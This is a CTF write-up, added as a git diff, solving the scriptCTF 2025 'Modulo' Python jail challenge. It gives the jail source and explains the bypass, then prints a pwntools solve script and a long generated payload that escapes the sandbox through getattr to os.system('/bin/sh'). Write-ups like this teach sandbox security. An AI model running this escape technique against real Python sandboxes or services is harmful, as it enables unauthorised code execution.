@@ -2,17 +2,247 @@
 title: 'scriptCTF 2025'
 description: 'writeup of scriptCTF 2025 (high school winner, open second)'
 date: 2025-08-17
-tags: ['writeups', 'rev', 'osint', 'misc', 'jail']
+tags: ['writeups', 'misc', 'jail']
 authors: ['cold']
 image: ./logo.png
 ---
 
 # Introduction
 
-In this CTF i played with [Cosmic Bit Flip](https://cosmicbitflip.org/) as a 4-player high school team.
+In this CTF i played with [Cosmic Bit Flip](https://cosmicbitflip.org/) as a 4-player high school team. We won first in the high school division and 3rd overall! ty to cbass, anywheres, and lolmenow who i played with, had a great time :)
 
-## Rev
+Here I'm only gonna write up one challenge, a pyjail, cuz it interested me the most.
 
-## Osint
+---
 
 ## Misc/Jail
+
+### Modulo
+
+> Modulo is so cool! (by @NoobMaster my goat)
+
+```python title=server.py
+import ast
+print("Welcome to the jail! You're never gonna escape!")
+payload = input("Enter payload: ") # No uppercase needed
+blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+for i in payload:
+    assert ord(i) >= 32
+    assert ord(i) <= 127
+    assert (payload.count('>') + payload.count('<')) <= 1
+    assert payload.count('=') <= 1
+    assert i not in blacklist
+
+tree = ast.parse(payload)
+for node in ast.walk(tree):
+    if isinstance(node, ast.BinOp):
+        if not isinstance(node.op, ast.Mod): # Modulo because why not?
+            raise ValueError("I don't like math :(")
+exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
+print('Bye!') 
+```
+
+#### Jail Restrictions
+
+The provided `server.py` implements several layers of filtering:
+
+- **Character Blacklist:** All lowercase letters except `c` are forbidden, as well as digits, backslash, semicolon, period, and underscore.
+- **Operator Restrictions:** Only one `<` or `>` and one `=` are allowed in the payload.
+- **AST Filtering:** Only the modulo (`%`) binary operator is permitted; all other binary operations are blocked. However, unary operations (like `-~x`) are allowed.
+- **Builtins:** The only available builtin is `c`, which is set to `getattr`.
+
+These constraints severely limit the ability to use normal Python syntax, attribute access, and string/number literals.
+
+#### Initial Reconnaissance
+
+##### Available Primitives
+
+- **`c = getattr`:** This is the only accessible builtin, and it's crucial for dynamic attribute access.
+- **Uppercase Letters:** All uppercase letters are allowed, enabling variable names and string construction.
+- **Modulo Operator:** The `%` operator is allowed, which enables format string operations.
+- **Unary Operators:** Not filtered, so expressions like `-~x` (which increments `x` by 1) are usable.
+
+##### Attribute Access
+
+Since only `c` is available and all other lowercase letters are blocked, direct access to most attributes is impossible. However, `getattr` can be used to dynamically access attributes if their names can be constructed at runtime.
+
+#### Building Numbers and Strings
+
+##### Constructing Integers
+
+- **Boolean Comparison:** The challenge allows one `<` or `>`, so `'@' < 'A'` yields `True` (which is `1` in Python).
+- **Unary Increment:** Using `-~x` repeatedly increments `x` by 1, so `-~I` is `2`, `-~-~I` is `3`, etc.
+
+##### Constructing Strings
+
+- **Format Strings:** The `%` operator allows constructing single characters: `'%c' % 65` yields `'A'`.
+- **Arbitrary Strings:** By chaining format strings, any string can be built: `'%c%c%c' % (65,66,67)` yields `'ABC'`.
+
+#### Solve Process
+
+##### Step 1: Initialize a Variable to 1
+
+Since only one comparison is allowed, use the walrus operator to assign the result of `'@' < 'A'` (which is `True`, i.e., `1`) to a variable (`I`):
+
+```python
+(I := ('@' < 'A'))
+```
+
+##### Step 2: Build Arbitrary Integers
+
+Define a helper function to construct any integer `n` using only `I` and unary increments:
+
+```python
+def expr_for(n):
+    return "-~" * (n-1) + "I"
+```
+
+##### Step 3: Build Arbitrary Strings
+
+Use format strings and the integer builder to construct any string:
+
+```python title=solve.py
+def string_expr(txt):
+    fmt = "'" + "%c" * len(txt) + "'"
+    exprs = ",".join(expr_for(ord(c)) for c in txt)
+    if len(txt) == 1:
+        exprs += ","
+    return f"{fmt} % ({exprs})"
+```
+
+##### Step 4: Dynamic Attribute Access
+
+Use `getattr` (`c`) to access attributes by dynamically built names:
+
+```python
+def getattr_call(obj, attr):
+    return f"c({obj},{string_expr(attr)})"
+```
+
+##### Step 5: Chain Attribute Access to Reach `os.system`
+
+- Get `__self__` from `c` to recover builtins.
+- Use `getattr` to get `__import__`.
+- Import `os`.
+- Get `system` from `os`.
+- Call `system("/bin/sh")`.
+
+##### Step 6: Assemble the Final Payload
+
+Combine all steps into a single payload tuple:
+
+```python
+PAYLOAD = f"({init},{step3})"
+```
+Where `init` sets `I`, and `step3` executes the shell.
+
+#### Final Exploit Script
+
+```python title=solve.py
+#!/usr/bin/env python3
+from pwn import *
+
+# ————————————————————————————————————————————————————————————————
+# 0. Helpers – build integers & strings without digit literals
+# ————————————————————————————————————————————————————————————————
+
+BASE_VAR = "I"   # after the walrus, I == 1
+
+def expr_for(n: int) -> str:
+    """
+    Produce an expression (only I and -~) that evaluates to the integer n (n>=1).
+      I    -> 1
+      -~I  -> 2
+      -~-~I -> 3
+      ...
+    """
+    if n < 1:
+        raise ValueError("n must be >= 1")
+    if n == 1:
+        return BASE_VAR
+    return "-~" * (n-1) + BASE_VAR
+
+def char_expr(ch: str) -> str:
+    """
+    Return a snippet that at runtime yields the one-char string `ch`,
+    via '%c' % (<expr_for(code)>).
+    """
+    code = expr_for(ord(ch))
+    return f"'%c' % ({code})"
+
+def string_expr(txt: str) -> str:
+    """
+    Return a snippet that at runtime yields the entire string `txt`,
+    by using '%c%c...%c' % (<expr1>, <expr2>, ...).
+    """
+    # Build the literal format: '%c%c...%c'
+    fmt = "'" + "%c" * len(txt) + "'"
+    # Build the tuple of expr_for(...) values
+    exprs = ",".join(expr_for(ord(c)) for c in txt)
+    # Single‐element tuple needs a trailing comma
+    if len(txt) == 1:
+        exprs += ","
+    return f"{fmt} % ({exprs})"
+
+def getattr_call(obj: str, attr: str) -> str:
+    """
+    Emit c(<obj>, <dynamic-attr-name>), i.e. getattr(<obj>, "<attr>").
+    """
+    return f"c({obj},{string_expr(attr)})"
+
+
+# ————————————————————————————————————————————————————————————————
+# 1. Build the one‐line exploit payload
+#    It is a 2-tuple: (I:=('@'<'A'), <spawn‐shell‐expr>)
+#    Uses exactly one '<', one '=', and only % formatting.
+# ————————————————————————————————————————————————————————————————
+
+# 1a) The walrus – sets I = 1  (one '<' and one '=')
+init = f"(I:=('@'<'A'))"
+
+# 1b) Build the needed names and strings at runtime:
+g_name   = string_expr("__globals__")
+b_name   = string_expr("__builtins__")
+imp_name = string_expr("__import__")
+os_mod   = string_expr("os")
+sys_name = string_expr("system")
+sh_str   = string_expr("/bin/sh")    
+
+# 1c) Chain getattr calls / indexing:
+step1 = getattr_call("c", "__self__")            # getattr(c, "__self__")
+step2 = f"c({step1},{imp_name})({os_mod})"          # getattr(B, "__import__")("os")
+step3 = f"c({step2},{sys_name})({sh_str})"          # getattr(os, "system")("/bin/sh")
+
+# 1d) Wrap into the final 2‐tuple
+PAYLOAD = f"({init},{step3})"
+
+# Quick sanity‐check against the jail’s own rules
+BLACK = set("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+assert not [ch for ch in PAYLOAD if ch in BLACK], "Leaked a forbidden char!"
+assert PAYLOAD.count('<') + PAYLOAD.count('>') == 1, "Wrong count of < or >"
+assert PAYLOAD.count('=') == 1, "Wrong count of ="
+
+print(f"→ Generated payload (length {len(PAYLOAD)}):\n")
+print(PAYLOAD)
+
+# ————————————————————————————————————————————————————————————————
+# 2. Spawn local stub, feed it the payload, and dump stdout+stderr
+# ————————————————————————————————————————————————————————————————
+
+p = remote("play.scriptsorcerers.xyz", 10480)
+
+p.recvuntil("Enter payload: ")
+p.sendline(PAYLOAD.encode())
+p.interactive()
+```
+
+#### Conclusion
+
+This challenge required deep understanding of Python's syntax and runtime behavior, creative use of allowed operators, and dynamic construction of both numbers and strings. The solution leveraged the walrus operator, unary increments, and format strings to bypass severe restrictions and achieve arbitrary code execution.
+
+**Payload Example:**
+
+```
+((I:=('@'<'A')),c(c(c(c,'%c%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)),'%c%c%c%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I))('%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)),'%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I))('%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)))
+```
+
